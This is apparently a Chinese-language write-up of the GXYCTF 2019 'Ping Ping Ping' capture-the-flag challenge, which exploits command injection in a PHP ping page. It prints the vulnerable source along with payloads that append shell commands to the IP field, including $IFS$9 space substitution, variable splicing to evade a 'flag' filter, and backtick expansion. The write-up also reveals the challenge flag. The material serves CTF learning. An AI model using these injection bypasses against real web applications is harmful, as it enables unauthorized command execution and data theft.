[GXYCTF 2019\]Ping Ping Ping | NSSCTF](https://www.nssctf.cn/problem/1096)
![image](https://github.com/user-attachments/assets/5f984538-9e63-4a91-899e-c9490e9544c2)
> ping的题目，看了一些知识点拿来练练

![image](https://github.com/user-attachments/assets/5e80ee1d-ec67-4c32-a3d5-61ac98b0ecd9)

> 先来随便ping一下

```
127.0.0.1
```

得到

![image](https://github.com/user-attachments/assets/94361425-da5d-432c-883c-3ffd564ee5a8)

> 再尝试一下添加管道符加其他指令

![image](https://github.com/user-attachments/assets/10f31790-ce1a-40ea-9a2e-7c8f0e1444f4)

> [!IMPORTANT]
发现目录下有两个php文件，有我们需要的flag

> 尝试能不能获取flag

ping `127.0.0.1|cat flag.php`

![image](https://github.com/user-attachments/assets/9f40e914-1b6a-4666-ac3d-d08e1268c664)

> **发现可能是空格被过滤了**

**比如**

1. 使用 `${IFS}` 代替空格

2. 使用 `< `或 `>` 重定向符号

3. 使用` {cat,flag.php}` 语法

4. 使用 `$()` 或反引号执行命令

5. 使用 `%09（Tab 字符）`代替空格

都会被过滤

贴张图

![image](https://github.com/user-attachments/assets/ae17d744-c7fb-4fa7-a97b-f17612975d51)

### 法一

> [!TIP]
使用$IFS$9绕过

> 先看看index.php里面源码写了啥

查看源码

``` php
	<?php
	if(isset($_GET['ip'])){
		$ip = $_GET['ip'];
		if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
			print_r($match);
			print($ip);
			echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
			die("fxck your symbol!");
		}
		else if(preg_match("/ /", $ip)){
			die("fxck your space!");
		}
		else if(preg_match("/bash/", $ip)){
			die("fxck your bash!");
		}
		else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
			die("fxck your flag!");
		}
		$a = shell_exec("ping -c 4 ".$ip);
		echo "<pre>";
		print_r($a);
	}

	?>
```

> [!IMPORTANT]
源码里面有过滤规则

- /.*f.*l.*a.*g.*/只要匹配到这四个字符组合在一起就显示fxck your flag!了
- 可以采取变量赋值的方式来做

输入 ping `127.0.0.1;q=g;cat$IFS$9fla$q.php`

再次查看源码

![image](https://github.com/user-attachments/assets/99ff9d0f-3f88-497e-a744-3ec90aed297f)

拿到flag

**NSSCTF{9cd25729-d16e-462c-976d-c4a5cb055b8b}**

### 法二

> [!TIP]
这个方法比较巧妙

***使用反引号绕过***

==**原理：**==

**linux下，会先执行反引号下面的语句
在这里会执行ls,ls的结果是“index.php flag.php”
所以最后执行的语句等价于
cat index.php flag.php**

试验一下

ping一下

![image](https://github.com/user-attachments/assets/08a85a49-f342-4e2a-9125-0867b84f8c01)

也是成功拿到flag

![image](https://github.com/user-attachments/assets/57a9377f-f349-4a9a-bf85-552bf28eae09)
